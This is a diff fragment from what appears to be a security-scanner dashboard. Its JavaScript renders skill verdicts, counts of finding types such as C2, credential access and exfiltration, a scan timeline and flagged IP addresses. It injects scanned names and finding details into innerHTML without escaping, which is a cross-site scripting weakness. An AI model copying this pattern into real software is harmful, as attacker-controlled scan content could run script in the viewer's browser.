+      var c=s.verdict==='CLEAN'?'var(--green)':s.verdict==='REVIEW'?'var(--yellow)':s.verdict==='SUSPICIOUS'?'var(--accent)':'var(--red)';
+      var sevC=s.verdict==='CLEAN'?'sev-clean':s.verdict==='REVIEW'?'sev-medium':s.verdict==='SUSPICIOUS'?'sev-high':'sev-critical';
+      var fhtml=s.findings.length>0?s.findings.map(function(f){var fc=f.severity==='CRITICAL'?'sev-critical':f.severity==='HIGH'?'sev-high':'sev-medium';return'<div class="skill-finding-mini"><span class="finding-sev '+fc+'" style="font-size:0.6rem;min-width:48px;padding:1px 4px">'+f.severity+'</span><span style="color:var(--text-dim);font-size:0.75rem">'+f.detail+'</span></div>'}).join(''):'<div style="font-size:0.75rem;color:var(--green);padding:4px 0">✓ No issues</div>';
+      return '<div class="skill-row" onclick="var d=document.getElementById(\'sd'+i+'\');d.classList.toggle(\'open\');this.querySelector(\'.skill-chevron\').textContent=d.classList.contains(\'open\')?\\'▾\\':\\'›\\'"><span class="skill-name">'+s.name+'</span><span class="skill-status" style="color:'+c+'">'+s.verdict+'</span><span class="skill-files">'+s.files+' files</span><span class="skill-chevron">›</span></div><div class="skill-detail" id="sd'+i+'"><div class="skill-detail-inner">'+fhtml+'</div></div>';
+    }).join('');
+  }
+
+  // Bars
+  var tc={known_c2:0,dangerous_command:0,credential_access:0,recent_credential_access:0,data_exfiltration:0,encoded_payload:0,suspicious_domain:0,unusual_connection:0};
+  allFindings.forEach(function(f){if(tc[f.type]!==undefined)tc[f.type]++});
+  var mx=Math.max(1,tc.known_c2,tc.dangerous_command,tc.credential_access+tc.recent_credential_access,tc.data_exfiltration,tc.encoded_payload,tc.suspicious_domain+tc.unusual_connection);
+  function sb2(id,cid,v){document.getElementById(id).style.width=(v/mx*100)+'%';document.getElementById(cid).textContent=v}
+  setTimeout(function(){sb2('bar-c2','count-c2',tc.known_c2);sb2('bar-cmd','count-cmd',tc.dangerous_command);sb2('bar-cred','count-cred',tc.credential_access+tc.recent_credential_access);sb2('bar-exfil','count-exfil',tc.data_exfiltration);sb2('bar-encoded','count-encoded',tc.encoded_payload);sb2('bar-net','count-net',tc.suspicious_domain+tc.unusual_connection)},300);
+
+  // Timeline
+  var tl=document.getElementById('timeline');
+  if(session.events.length>0){
+    tl.innerHTML=session.events.slice().reverse().map(function(e){
+      var ic=e.type==='full_scan'?'icon-scan':e.type==='inline_block'?'icon-block':'icon-watch';
+      var em=e.type==='full_scan'?'🔍':e.type==='inline_block'?'🚫':'👁';
+      var ago=Math.round((Date.now()-new Date(e.timestamp).getTime())/60000);
+      var as=ago<1?'just now':ago<60?ago+'m ago':Math.round(ago/60)+'h ago';
+      return'<div class="timeline-row"><div class="timeline-icon '+ic+'">'+em+'</div><span class="timeline-msg"><strong>'+e.type.replace(/_/g,' ')+'</strong> — '+e.findings+' findings</span><span class="timeline-time">'+as+'</span></div>';
+    }).join('');
+  }
+
+  // Network
+  var nl=document.getElementById('net-list'),nb=document.getElementById('net-badge');
+  var nf=scan.network_check||[];
+  if(nf.length>0){nb.textContent=nf.length+' flagged';nb.className='badge-sm badge-orange';
+    nf.forEach(function(n){var r=document.createElement('div');r.className='net-row';var m=n.detail.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/);r.innerHTML='<span style="color:var(--accent)">'+(m?m[1]:n.detail)+'</span><span class="dim">'+(m&&m[2]?m[2]:'—')+'</span><span style="color:var(--yellow)">⚠ '+n.severity+'</span><span class="dim">'+n.type+'</span>';nl.appendChild(r)})}
+}
+
+function refreshDashboard(){var b=document.querySelector('.btn-refresh');b.textContent='↻ Refreshing...';b.style.color='var(--accent)';setTimeout(function(){b.textContent='↻ Refresh';b.style.color='';renderDashboard()},500)}
+
+renderDashboard();
+</script>
+</body>
+</html>
